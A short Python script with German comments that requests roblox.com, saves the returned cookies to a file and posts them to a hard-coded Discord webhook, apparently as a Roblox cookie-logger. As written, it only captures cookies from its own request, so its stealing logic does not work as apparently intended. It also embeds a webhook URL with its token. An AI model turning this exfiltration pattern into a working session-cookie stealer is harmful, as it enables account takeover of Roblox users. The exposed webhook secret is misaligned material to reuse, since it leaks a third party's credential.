import requests
from bs4 import BeautifulSoup

# Discord-WebHook-URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'

# URL der Roblox-Seite (Beispiel-URL)
url = 'https://www.roblox.com'

# Sende eine GET-Anfrage an die Website
response = requests.get(url)

# Hole Cookies aus der Antwort
cookies = response.cookies

# Speichere die Cookies in einer Datei
with open('cookies.txt', 'w') as file:
    for cookie in cookies:
        file.write(f"{cookie.name}: {cookie.value}\n")

# Lies die Cookies aus der Datei
with open('cookies.txt', 'r') as file:
    log_data = file.read()

# Bereite die Nachricht für den WebHook vor
payload = {
    'content': f'Cookies:\n{log_data}'
}

# Sende die Nachricht an Discord
requests.post(WEBHOOK_URL, json=payload)
